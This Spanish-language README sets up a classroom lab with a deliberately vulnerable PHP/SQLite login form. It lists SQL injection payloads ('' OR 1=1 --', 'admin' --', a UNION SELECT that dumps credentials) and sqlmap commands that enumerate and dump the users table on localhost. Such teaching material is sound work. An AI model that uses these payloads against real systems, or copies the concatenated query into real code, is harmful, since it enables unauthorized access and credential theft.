# SQL-Injection-Equipo4

**Aplicación:** Login Vulnerable

**Vulnerabilidad:** Injection — SQL Injection (OWASP A03:2021 – Injection)

**Tecnologías:** PHP 8, PDO, SQLite, HTML5, CSS3, sqlmap, Python 3, Terminal / PowerShell.

## Objetivo

Identificar y demostrar una vulnerabilidad de **inyección SQL** en un formulario de inicio de sesión provocada por la concatenación directa de datos del usuario dentro de la consulta, ejecutar pruebas de concepto manuales (`admin' --`, `' OR 1=1 --`, `UNION SELECT`) y automatizadas (**sqlmap**), y documentar el impacto. La corrección mediante **consultas preparadas** se desarrolla y explica en clase.

## Descripción de la práctica

La aplicación es un formulario de login desarrollado con PHP y SQLite que valida un usuario y una contraseña contra la tabla `usuarios`.

En su versión insegura, la consulta se arma concatenando directamente el texto que escribe el usuario:

```php
$sql = "SELECT usuario, password FROM usuarios WHERE usuario = '$usuario' AND password = '$password'";
```

Esto corresponde a la categoría **OWASP A03:2021 – Injection**. Al no separar los datos de la instrucción SQL, caracteres y palabras como comillas, `--`, `OR` o `UNION` pueden cambiar la estructura y el significado de la consulta, permitiendo:

- **Autenticación sin credenciales** (bypass del login).
- **Extracción de datos** de la tabla mediante `UNION SELECT`.
- **Explotación automatizada** con sqlmap.

La práctica consiste en reproducir estas fallas de forma manual y con sqlmap, documentar las evidencias, y posteriormente (en clase) aplicar el correctivo con consultas preparadas.

## Herramientas necesarias

| Herramienta | Uso |
|---|---|
| PHP 8 (o 7.4+) | Lenguaje y entorno de ejecución de la aplicación |
| XAMPP | Paquete que incluye PHP y Apache para servir la aplicación en Windows |
| Extensión `pdo_sqlite` | Conexión a la base de datos SQLite (incluida en XAMPP) |
| Python 3 | Requerido para ejecutar sqlmap |
| sqlmap | Explotación automatizada de la inyección SQL |
| Navegador web | Pruebas manuales e inspección de la interfaz |
| Visual Studio Code | Revisión y edición del código fuente |
| Terminal / PowerShell | Ejecución de comandos de servidor y de sqlmap |
| Git | Clonar los repositorios del proyecto y de sqlmap |

> Nota: todas las pruebas se realizan localmente en Windows (también funciona en macOS o Linux).

## Preparación del entorno

### 1. Instalar XAMPP (Windows)

Descarga XAMPP desde <https://www.apachefriends.org/es/index.html> e instálalo (por defecto en `C:\xampp`). XAMPP incluye **PHP**, **Apache** y la extensión **`pdo_sqlite`** ya habilitada, por lo que no es necesario instalar PHP por separado.

### 2. Verificar PHP y la extensión SQLite

```bash
php -v
php -m | findstr /i sqlite   # Windows (CMD / PowerShell)
php -m | grep -i sqlite      # Linux / macOS / Git Bash
```

Debe aparecer `pdo_sqlite` en la lista (viene activa por defecto en XAMPP).

> En Windows, si `php` no se reconoce como comando, usa la ruta completa `C:\xampp\php\php.exe`.

### 3. Clonar el repositorio

```bash
git clone https://github.com/JonathanHe956/SQL-Injection-Equipo4.git
cd SQL-Injection-Equipo4
```

### 4. Ejecutar la aplicación

Opción 1 — Servidor integrado de PHP (recomendado):

```bash
php -S localhost:8000
```

Abre en el navegador: <http://localhost:8000/index.php>. Para detener el servidor presiona `Ctrl + C`.

> En Windows con XAMPP, si `php` no se reconoce como comando, usa la ruta completa:
> ```bash
> C:\xampp\php\php.exe -S localhost:8000
> ```

Opción 2 — XAMPP (Apache):

1. Copia la carpeta dentro de `C:\xampp\htdocs\`.
2. Abre el **XAMPP Control Panel** e inicia **Apache**.
3. Abre: <http://localhost/SQL-Injection-Equipo4/>

## Instalación de sqlmap en Windows

sqlmap está escrito en Python, por lo que primero se necesita Python 3.

### 1. Instalar Python 3

Descarga Python desde <https://www.python.org/downloads/windows/> e instálalo. **Marca la casilla "Add Python to PATH"** durante la instalación. Verifica:

```powershell
python --version
```

### 2. Instalar sqlmap con pip

```powershell
pip install sqlmap
```

> Alternativa sin pip: clónalo con Git con `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev` y ejecútalo con `python sqlmap.py ...` desde esa carpeta.

### 3. Verificar que funciona

```powershell
sqlmap --version
```

Debe mostrar la versión de sqlmap.

## Base de datos

Al cargar la página por primera vez, `db.php`:

1. Crea el archivo `demo.db` (SQLite) si no existe.
2. Crea la tabla `usuarios` si no existe.
3. Inserta el usuario `admin` si la tabla está vacía.
4. Agrega las cuentas de demostración que aún no existan.

La base `demo.db` **no se incluye en el repositorio**: se genera sola.

**Credenciales de prueba:**

| Usuario | Contraseña |
|---|---|
| `admin` | `admin123` |
| `axhel` | `password` |
| `pablo` | `123456` |
| `jonathan` | `windows` |
| `alondra` | `contraseña` |
| `omar` | `987654321` |
| `justin` | `administracion` |

Para reiniciar la base de datos, borra el archivo y recarga la página:

```bash
del demo.db       # Windows (CMD / PowerShell)
rm demo.db        # Linux / macOS / Git Bash
```

> La carpeta del proyecto debe tener permisos de escritura para que PHP pueda crear `demo.db`.

## Demostración de las vulnerabilidades (Versión Insegura)

> Para estas pruebas debe estar activa la **consulta vulnerable** en `index.php` (el bloque concatenado). Las dos versiones conviven comentadas en el archivo mediante `//`.

### Prueba 1. Bypass de autenticación (`OR 1=1`)

En el campo **Usuario** escribe una de estas cargas (la **Contraseña** puede quedar vacía o con cualquier texto):

| Campo Usuario | Efecto |
|---|---|
| `admin' --` | Inicia sesión como `admin` comentando la comprobación de la contraseña |
| `' OR 1=1 --` | Accede sin credenciales porque la condición siempre es verdadera |

**Resultado esperado:** "Acceso concedido" sin conocer la contraseña. Por ejemplo, con `' OR 1=1 --` la consulta ejecutada queda así:

```sql
SELECT usuario, password FROM usuarios WHERE usuario = '' OR 1=1 --' AND password = '...'
```

La condición `1=1` siempre es verdadera y `--` comenta el resto de la consulta, así que la verificación de la contraseña se ignora. Con `admin' --`, la comilla cierra el nombre `admin` y `--` comenta la parte de la contraseña, iniciando sesión como ese usuario.

### Prueba 2. Extracción de datos (`UNION SELECT`)

En el campo **Usuario**, ingresa una carga que una otra consulta. La consulta original devuelve dos columnas (`usuario` y `password`), por lo que el `UNION SELECT` debe devolver dos columnas:

```
' UNION SELECT usuario, password FROM usuarios-- -
```

**Resultado esperado:** si la prueba se ejecuta desde localhost, se listan las cuentas de la tabla; cada resultado muestra encima el texto `UNION` ingresado y debajo los campos Usuario y Contraseña.

### Prueba 3. Explotación automatizada con sqlmap

Con la aplicación corriendo (`http://localhost:8000/index.php`), ejecuta:

**1. Detectar la inyección**

```powershell
sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --batch
```

**2. Confirmar el motor de la base de datos (SQLite)**

```powershell
sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite --batch
```

**3. Listar las tablas**

```powershell
sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite --tables --batch
```

**4. Volcar la tabla `usuarios`**

```powershell
sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite -T usuarios --dump --batch
```

**Resultado esperado:** sqlmap identifica el parámetro `usuario` como **inyectable**, determina el motor (SQLite) y, con `--dump`, extrae el contenido de la tabla `usuarios` (usuarios y contraseñas en texto plano).

## Tabla de Resultados Esperados

| Prueba | Versión Vulnerable | Versión Corregida |
|---|---|---|
| `admin' --` en Usuario | Inicia sesión como `admin` sin contraseña | "Datos incorrectos" |
| `' OR 1=1 --` en Usuario | Acceso concedido (bypass del login) | "Datos incorrectos" |
| `UNION SELECT ...` en Usuario | Lista las cuentas de la tabla | "Datos incorrectos" / sin listado |
| sqlmap sobre el parámetro `usuario` | Parámetro inyectable; base de datos extraída | Parámetro no inyectable |
| Login normal (cuenta válida) | Acceso concedido | Acceso concedido |

> La corrección (consultas preparadas) se aplica y explica en clase; por eso en este repositorio no se incluye el código de la solución.

## Evidencias recomendadas para el reporte

Las evidencias se documentan en formato **antes y después**: primero el ataque funcionando sobre la versión vulnerable y luego el mismo ataque rechazado tras aplicar la corrección en clase (sin mostrar el código de la solución).

### Antes (versión vulnerable)

- **Formulario de login:** captura de la pantalla de inicio de sesión.
- **Bypass con `admin' --`:** campo Usuario con `admin' --` y el resultado "Acceso concedido".
- **Bypass con `' OR 1=1 --`:** campo Usuario con `' OR 1=1 --` y el resultado "Acceso concedido".
- **UNION SELECT (entrada):** campo Usuario con `' UNION SELECT usuario, password FROM usuarios-- -`.
- **UNION SELECT (resultado):** listado de cuentas (usuarios y contraseñas) mostrado por la inyección.
- **sqlmap — comando 1 (detectar):** captura de `sqlmap ... -p usuario --batch` marcando el parámetro como inyectable.
- **sqlmap — comando 2 (motor):** captura de `sqlmap ... --dbms=sqlite --batch` confirmando SQLite.
- **sqlmap — comando 3 (tablas):** captura de `sqlmap ... --tables --batch` con el listado de tablas.
- **sqlmap — comando 4 (volcado):** captura de `sqlmap ... -T usuarios --dump --batch` con los usuarios y contraseñas extraídos.

### Después (versión corregida)

- **Bypass bloqueado:** `admin' --` y `' OR 1=1 --` ahora devuelven "Datos incorrectos".
- **UNION bloqueado:** la misma entrada `UNION SELECT` ya no muestra el listado de cuentas.
- **sqlmap sin resultados:** una sola captura ejecutando un comando de sqlmap que ahora indica que el parámetro `usuario` no parece inyectable.
- **Login normal:** una cuenta válida sigue iniciando sesión correctamente.

## Conclusión de la práctica

Esta actividad demuestra cómo la concatenación directa de datos del usuario dentro de una consulta SQL (OWASP A03:2021 – Injection) permite evadir la autenticación, extraer información de la base de datos y automatizar por completo el ataque con herramientas como sqlmap. La corrección mediante **consultas preparadas** —que separan la instrucción SQL de los datos— se desarrolla y explica en clase.

## Referencias

- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Cheat Sheet – Prevención de SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [sqlmap – sitio oficial](https://sqlmap.org/)
- [PHP – PDO y sentencias preparadas](https://www.php.net/manual/es/pdo.prepared-statements.php)
